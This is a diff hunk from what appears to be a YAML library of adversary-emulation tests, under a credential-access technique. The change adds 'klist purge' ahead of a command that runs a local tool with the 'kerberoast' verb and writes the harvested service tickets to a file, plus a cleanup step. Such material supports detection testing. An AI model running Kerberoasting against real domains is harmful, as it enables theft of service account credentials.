@@ -2705,10 +2705,9 @@ credential-access:
 
 '
       executor:
-        command: 'cmd.exe /c "#{local_folder}\#{local_executable}" kerberoast #{flags}
-          /outfile:"#{local_folder}\#{out_file}"
-
-'
+        command: |
+          klist purge
+          cmd.exe /c "#{local_folder}\#{local_executable}" kerberoast #{flags} /outfile:"#{local_folder}\#{out_file}"
         cleanup_command: 'Remove-Item #{local_folder}\#{out_file} -ErrorAction Ignore
 
 '
